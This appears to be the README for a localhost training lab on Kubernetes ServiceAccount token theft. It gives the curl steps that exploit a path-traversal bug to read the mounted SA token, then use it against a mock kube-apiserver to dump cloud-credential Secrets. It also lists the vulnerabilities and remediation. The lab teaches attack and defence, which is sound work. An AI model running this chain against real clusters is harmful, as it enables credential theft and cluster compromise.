Cloud Lab 06. K8s-SA-Token-Theft — Flask (Python), self-contained  ✅ (exploit verified on this box)

A pod's web app has a path-traversal (LFI) bug. Kubernetes auto-mounts the pod's
ServiceAccount token at /var/run/secrets/kubernetes.io/serviceaccount/token, and
this SA is over-privileged (it can list/read Secrets cluster-wide). So the chain
is: LFI -> read the mounted SA token -> call the kube-apiserver with it -> dump
Secrets from other namespaces (here, cloud credentials in kube-system).

1: Get the lab:   unzip K8s-SA-Token-Theft.zip && cd 06-K8s-SA-Token-Theft
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9106/          <-- {"app":"prod-api (in a Kubernetes pod)",...}
   # Quick win:
   # a) LFI -> steal the mounted ServiceAccount token
   TOK=$(curl -s 'localhost:9106/download?file=../../var/run/secrets/kubernetes.io/serviceaccount/token')
   echo "$TOK"
   # b) use the token against the apiserver (127.0.0.1:9107) -> list cluster secrets
   curl -s -H "Authorization: Bearer $TOK" localhost:9107/api/v1/secrets
   # c) read + decode the cloud credentials in kube-system
   curl -s -H "Authorization: Bearer $TOK" localhost:9107/api/v1/namespaces/kube-system/secrets/cloud-credentials
   #   data.aws_secret_access_key (base64) -> kubeSystemStolenSecretKeyEXAMPLE1234567890
   # Control: the same apiserver call WITHOUT the token returns HTTP 401.
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no cluster)
    curl + base64

Endpoints:
    GET  /                                                  -> pod app banner
    GET  /download?file=<path>                              -> serves files, no sanitization  [LFI]
    (mock kube-apiserver on 127.0.0.1:9107, Bearer-token auth)
    GET  /api/v1/secrets                                    -> list all secrets   [needs token]
    GET  /api/v1/namespaces/<ns>/secrets/<name>            -> read one secret    [needs token]

List of Vulnerabilities (all verified on this box):
    Path traversal / LFI — /download joins user input to the docroot with no
        sanitization, reaching the mounted SA token via ../../.
    ServiceAccount token exposure — the default projected SA token is readable
        from inside the pod filesystem.
    Over-privileged ServiceAccount — the SA can list/read Secrets cluster-wide
        (should be namespaced/least-privilege via RBAC).
    Cluster secret exfiltration — kube-system/cloud-credentials (AWS keys) dumped.

Remediation: fix the traversal; set automountServiceAccountToken:false where not
needed; scope RBAC to least privilege; don't store long-lived cloud creds as Secrets.
